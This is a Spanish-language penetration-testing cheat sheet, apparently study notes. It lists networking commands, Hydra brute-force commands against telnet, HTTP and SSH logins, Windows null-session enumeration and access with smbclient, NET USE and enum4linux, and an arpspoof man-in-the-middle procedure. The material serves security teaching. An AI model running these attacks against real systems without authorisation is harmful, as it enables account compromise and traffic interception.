# Network Attacks Cheat Sheet

## Networking

### Tabla de rutas

- Linux

`ip route`

- Windows

`route print`

- macOS

`netstat -r`

### Información de la interfaz

- Windows

`ipconfig /all`

- *nix o macOS

`ifconfig`

- Linux

`ip addr`

### Tabla ARP

- Windows

`arp -a`

- *nix

`arp`

- Linux

`ip neighbour`

### Rutas estáticas

- Linux

`ip route add [network] via [gw] dev [interface]`

`ip route add 172.16.0.0/16 via 192.168.1.1 dev eth0`

`ip route add deafult via 192.168.1.1 dev eth0`

- Windows

`route add [network] mask [mask] [gw]`

`route add 192.168.35.0 mask 255.255.255.0 192.168.0.2`

### Sesiones abiertas

- Windows

`netstat -ano`

- Linux

```
-t: habilita TCP
-u: habilita UDP
-n: mostrar solo la IP
-p: muestra el PID y el nombre del programa
```

`netstat -tunp`

- macOS

`netstat -p tcp -p udp`

 `lsof –n –i4TCP –i4UDP`
 
 ## Cracking Online
 
 ### Cracking de autenticación
 
 Es posible crackear la autenticación de varios protocolos de red como, por ejemplo:

-	SSH
-	Telnet
-	Autenticación HTTP
-	RDP

Para el cracking de la autenticación de red, se recomienda usar un ataque basado en diccionario, debido que, en el cracking online, influye lo siguiente:

-	Latencia de la red
-	Delay del servicio atacado
-	Tiempo de proceso en el servidor atacado

El siguiente [link](https://wiki.skullsecurity.org/Passwords) posee varios diccionarios que pueden ser utilizados en este tipo de ataques.

En caso de querer instalar los diccionarios, en Kali se puede usar el siguiente comando, que los guarda en la siguiente ruta: `/usr/share/seclists/Passwords`

`apt install seclists`

### Hydra

Herramienta que permite realizar cracking de autenticación de múltiples protocolos usando un método de fuerza bruta o basado en diccionario. Hydra trabaja con módulos, los cuales, son códigos que permiten atacar a un protocolo específico. Dentro de los protocolos soportados, se encuentran los siguientes:

- Cisco Auth
-	RDP
-	FTP
-	SMB
-	IMAP
-	Telnet
-	HTTP
-	SSH

Comando:

`hydra [option]`

```
-h: Ayuda
-U [module]: Obtener el detalle de un módulo. Estos módulos se encuentran en la sección “Supported services” de la ayuda
-L: Lista de usuarios
-P: Lista de passwords
-f: Detener la busqueda con el primer resultado
-V: Verbose
http-post-form: Usar formulario POST
http-get: Usar método GET
```

#### Ejemplo de obtención de detalle de módulo RDP

`hydra -U rdp`

#### Ejemplo cracking telnet con ataque de diccionario

`hydra -L user.txt -P pass.txt telnet://target.server`

#### Ejemplo de ataque de autenticación HTTP básica

`hydra -L user.txt -P pass.txt http-get://target.server`

#### Ejemplo de ataque de autenticación HTTP en login usando POST

`hydra target.site http-post-form “/login.php:usr=^USER^&pwd=^PASS^:invalid credentials” -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/rockyou-15.txt -f -V`

#### Ejemplo de ataque de autenticación SSH

`hydra target.site ssh -L user.txt -P pass.txt -f -V`

## Windows Shares

### NetBIOS

NetBIOS (Network Basic input Output System) es un protocolo que permite compartir archivos, administración de impresoras, proveer autenticación, etc., entre un cliente y un servidor.

Este protocolo puede proveer lo siguiente:

-	Hostname
-	NetBIOS name
-	Dominio
-	Network shares

Utiliza los siguientes puertos:

-	**UDP 137:** NetBIOS names. Usado para encontrar grupos de trabajo (workgroups).
-	**UDP 138:** NetBIOS datagrams. Usado para listar los shares y las máquinas.
-	**TCP 139:** NetBIOS Session. Usado para transmitir datos para y desde un Windows share.

Un Windows puede compartir un archivo o un directorio en la red (shares).

Se puede acceder mediante un UNC (Universal Naming Convertion) Path. Ejemplo: **\\\ServerName\ShareName\file.txt**

#### Share Administrativos por defecto usados por el sysadmin de Windows

Permite a un admin ingresar a un volumen de la máquina

`\\ComputerName\C$`

#### Apunta al directorio de instalación de Windows

`\\ComputerName\admin$`

#### Es usado por inter-process communication (No se puede acceder por Windows Explorer)

`\\ComputerName\ipc$`

### Null Sessions

Ataque que puede ser usado para enumerar y obtener la siguiente información:

-	Passwords
-	Usuarios de sistema
-	Grupos de sistema
-	Procesos corriendo en el sistema

Este ataque explota una vulnerabilidad de autenticación para Windows Administrative Share, permitiendo conectarse al local share o remote share sin autenticación. 

#### Nbtstat

Herramienta de Windows que permite enumerar Windows Shares.

`nbtstat [option]`

```
/?: Help
-A [IP]: Mostrar información del objetivo:
         Name: Nombre de la máquina
         Type: <00> equivale a Workstation. <20> Servicio de file sharing corriendo la máquina. UNIQUE indica que solo tiene una IP
         También, muestra el dominio o el workgroup al que pertenece
```

#### NET VIEW

Herramienta que permite enumerar los shares detectados con nbtstat (type <20>).

`NET VIEW [IP]`

#### Nmblookup

Herramienta de enumeración para Linux. Esta corresponde a la Suite de Samba.

`nmblookup [option]`

```
-A [IP]: Muestra información de objetivo (similar a nbtstat -A [IP])
```

#### Smbclient

Utilidad de la Suite de Samba que permite acceder a los shares de Windows.

`smbclient [option] //[IP] [option]`

```
-L: Permite ver que servicios están disponibles en el objetivo
-N: Fuerza a la herramienta a no preguntar por la password
```

##### Ejemplo de enumeración: similar a NET VIEW

`smbclient -L //192.168.10.12 -N`

##### Ejemplo de ataque usando null session

`smbclient  //192.168.10.12/IPC$ -N`

`smbclient  //192.168.10.12/C$ -N`


#### NET USE

Herramienta de Windows que permite explotar null sessions.

`NET USE \\[IP]\IPC$ '' /u: ''`

#### [Enum](https://packetstormsecurity.com/search/?q=win32+enum&s=files)

Herramienta para Windows que puede obtener información del sistema vulnerable a null sessions.

`enum [option] [IP]`

```
-S: Enumeración de shares
-U: Enumeración de usuarios
-P: Enumeración de parámetros de password (con esto se pueden realizar otros tipos de ataques)
```

#### [Winfo](https://packetstormsecurity.com/search/?q=winfo&s=files)

Herramienta para Windows que permite automatizar la explotación de los null session.

`winfo [IP] -n`

#### Enum4Linux

Herramienta similar a enum y winfo, pero para Linux.

Por defecto, este ejecuta:

-	Enumeración de:
  -	Usuarios
  -	Shares
  -	Grupos y miembros
  -	Extracción del Password Policy
  -	Detección de información del OS
  -	Ejecuta un nmblookup
  -	Extracción de información de las impresoras

`enum4linux [option] [IP]`

```
-a: Realiza todas las enumeraciones simples (-U -S -G -P -r -o -n -i)
```

Solución error de SMB:

- Agregar lo siguiente al archivo de configuracion de SMB: `/etc/samba/smb.conf`

```
# Fix enum4linux error
   client min protocol = CORE
   client max protocol = SMB3
```

## ARP Poisoning

Este ataque permite interceptar tráfico de una red manipulando la tabla ARP de los demás (ataque man-in-the-middle, MITM). El ataque se logra enviando mensajes Gratuitous ARP Replies (mensajes ARP Reply no solicitados).

El atacante puede evitar que el envenenamiento expire un mensaje Gratuitous ARP Reply cada 30 segundos (por ejemplo). 

### ARPspoof

Arpspoof es una herramienta de la colección Dsniff, la cual, permite realizar ataques de ARP spoofing.

`arpspoof -i [interface] -t [target] -r [host]`

#### Ataque usando ARPspoof

1. Habilitar reenvío de paquetes:

`echo 1 > /proc/sys/net/ipv4/ip_forward`

2. Lanzar ARPspoof:

`arpspoof -i eth0 -t 192.168.1.12 -r 192.168.1.30`
